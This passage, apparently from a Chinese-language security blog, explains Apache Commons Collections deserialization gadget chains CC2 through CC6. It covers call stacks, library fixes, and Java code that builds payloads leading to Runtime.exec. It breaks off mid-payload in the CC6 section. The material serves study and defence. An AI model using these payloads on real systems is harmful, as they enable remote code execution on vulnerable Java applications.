        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        String randomClassName <span class="token operator">=</span> <span class="token string">"EvilCat"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
        TemplatesImpl templates <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Field bf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// 进入 defineTransletClasses() 方法需要的条件</span>
        Field nf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field cf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        TransformingComparator comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        PriorityQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Field fq <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fq<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> queueArray <span class="token operator">=</span> <span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> fq<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        queueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> templates<span class="token punctuation">;</span>
        queueArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        Field fc <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fc<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fc<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> queue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><del>没有验证这个代码的可用性，因为懒得去翻老版本的Common Collections4了</del></p>
<p>往PriorityQueue里面塞两个破烂是因为要队列里面至少有两个元素才能触发排序，因为要add一下size才会+1，直接反射往里面塞是不加size的，然后再反射一手把queue里面的数据改成我们的emplateImpl，在比较的时候用invokerTransformer触发</p>
<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>把Common collections4的invokerTransformer的Serializable给去掉了，在4.1中即生效，也就是说只能打4.0（现在都更新到4.4了）</p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>将CC1中的一组InvokerTransformer换成了一个InstantiateTransformer，然后再塞一个templateImpl，因为约等于CC1，所以也只对远古版本jdk有效，约等于没有用</p>
<h3 id="调用栈-2"><a href="#调用栈-2" class="headerlink" title="调用栈"></a>调用栈</h3><p>约等于CC1，这里就最后改成了InstantiateTransformer，实例化类的时候调用了newTransform方法，配合templateImpl打通</p>
<h3 id="从InstantiateTransformer到templateImpl-newTransformer"><a href="#从InstantiateTransformer到templateImpl-newTransformer" class="headerlink" title="从InstantiateTransformer到templateImpl.newTransformer"></a>从InstantiateTransformer到templateImpl.newTransformer</h3><p>这个玩意的transformer有点猛，进去就看到一个newInstance</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token keyword">instanceof</span> <span class="token class-name">Class</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span>
                    <span class="token string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span>
                        <span class="token operator">+</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null object"</span> <span class="token operator">:</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            Constructor con <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Class<span class="token punctuation">)</span> input<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">catch</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>然后看到TrAXFilter这个类的构造函数</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token function">TrAXFilter</span><span class="token punctuation">(</span>Templates templates<span class="token punctuation">)</span>  <span class="token keyword">throws</span>
        TransformerConfigurationException
    <span class="token punctuation">{</span>
        _templates <span class="token operator">=</span> templates<span class="token punctuation">;</span>
        _transformer <span class="token operator">=</span> <span class="token punctuation">(</span>TransformerImpl<span class="token punctuation">)</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        _transformerHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerHandlerImpl</span><span class="token punctuation">(</span>_transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        _useServicesMechanism <span class="token operator">=</span> _transformer<span class="token punctuation">.</span><span class="token function">useServicesMechnism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>直接调用自己的templates的newTransformer</p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> Templates<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> templatesImpl <span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>把CC1和CC2缝合一下，其中transformer改成这个就行</p>
<h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>因为触发方法和CC1一致，通过proxy调用invoke最后到LazyMap.get，所以AnnotationInvocationHandler的LazyMap那一改就打不通了</p>
<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>把CC2触发templateImpl的InvokerTransformer换成InstantiateTransformer，因为用的是PriorityQueue这条线，所以得用TransformingComparator，所以只用于Common Collections4，也被修了，高版本也用不了。</p>
<h3 id="调用栈-3"><a href="#调用栈-3" class="headerlink" title="调用栈"></a>调用栈</h3><p>和CC2类似</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>超级缝合怪，已经不用加新东西了，把CC2和CC3再缝合一下即可，不贴代码</p>
<h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>类似CC2，把InstantiateTransformer的Serializable也去掉了，也是4.1版本即生效，呜呜</p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>新摸出来的一条的到LazyMap的链<br>Common collections3&#x2F;4均适用（当然是低版本。。。不过对Common collections3的话不是那么低版本）</p>
<h3 id="调用栈-4"><a href="#调用栈-4" class="headerlink" title="调用栈"></a>调用栈</h3><pre class=" language-java"><code class="language-java">Gadget chain<span class="token operator">:</span>
    ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        BadAttributeValueExpException<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            TiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    LazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                        ChainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            ConstantTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Class<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                                    Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>注释里提到</p>
<blockquote>
<p>This only works in JDK 8u76 and WITHOUT a security manager</p>
</blockquote>
<p>高版本无security manager时可用，顺着看</p>
<h3 id="BadAttributeValueExpException到LazyMap-get"><a href="#BadAttributeValueExpException到LazyMap-get" class="headerlink" title="BadAttributeValueExpException到LazyMap.get()"></a>BadAttributeValueExpException到LazyMap.get()</h3><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
        ObjectInputStream<span class="token punctuation">.</span>GetField gf <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            val <span class="token operator">=</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            val<span class="token operator">=</span> valObj<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>
                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>
            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>其val属性不为null不为String且System.getSecurityManager() &#x3D;&#x3D; null时，调用其val属性的toString，而TiedMapEntry的toString函数很简单，配合getValue使用，直接map.get</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> Object <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>只需把CC1中触发的那段改为这个即可</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p>CC1的后半边换成</p>
<pre class=" language-java"><code class="language-java">        BadAttributeValueExpException exception <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field valfield <span class="token operator">=</span> exception<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> exception<span class="token punctuation">;</span>
</code></pre>
<p>Common Collections4想用的话把所有import改成collection4，然后反射获取Constructor构造一下LazyMap即可（要我说invokerTransformer挂了就是用不了嘛）</p>
<h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><p>对Common collections4而言，在4.1InvokerTransformer的Serializable就没了<br>而对Common collections3，同Common Collections4中的的修复方案，把InvokerTransformer的Serializable去掉了，呜呜<br>该修复在Common Collections3.2.2中出现，这是Common Collections3的最新版本（当然理论上Common Collections3系列以及被抛弃了，现在都在更新Common Collections4）<br>所以估计在版本号上似乎3的修复很晚，但时间线上可能差不多。。。</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>同样Common Collections3&#x2F;4通用，版本限制相同</p>
<h3 id="调用栈-5"><a href="#调用栈-5" class="headerlink" title="调用栈"></a>调用栈</h3><pre><code>Gadget chain:
    java.io.ObjectInputStream.readObject()
        java.util.HashSet.readObject()
            java.util.HashMap.put()
            java.util.HashMap.hash()
                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                        java.lang.reflect.Method.invoke()
                            java.lang.Runtime.exec()
</code></pre>
<h3 id="HashMap到LazyMap-get"><a href="#HashMap到LazyMap-get" class="headerlink" title="HashMap到LazyMap.get"></a>HashMap到LazyMap.get</h3><p>有两个触发点，一个是像yso一样整个HashSet套HashMap，HashSet的readObject在最后会调用其map的put方法，而put则调用hash方法<br>如果直接用HashMap的话，其readObject方法则直接调用hash方法，也能走到对应步骤</p>
<p>hash方法调用key的hashCode方法，令key为TiedMapEntry，其hashCode方法调用getValue方法，而getValue方法自然就是调用map.get，到我们喜闻乐见的lazymap.get环节</p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC6</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>

